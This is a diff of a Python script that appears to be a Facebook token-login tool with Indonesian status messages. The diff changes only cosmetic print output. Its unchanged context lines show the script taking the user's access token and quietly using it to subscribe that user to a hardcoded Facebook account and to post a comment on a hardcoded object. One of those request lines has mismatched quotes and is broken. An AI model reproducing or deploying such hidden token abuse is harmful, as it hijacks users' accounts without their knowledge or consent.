@@ -13,7 +13,7 @@ def main():
         nama = a["name"]
     except (KeyError,IOError):
         print('%s║'%(M))
-        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
+        print('%s╚══[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         exit(manda.menu_log())
 	nama_user = "Name : " + nama
@@ -25,5 +25,5 @@ def main():
     requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) 
     requests.post("https://graph.facebook.com/100017584682867/comments/?message=' + kom + '&access_token=' + token)
     print('%s║'%(O))
-    print('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
+    print('%s╚══[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
     exit(manda.menu())
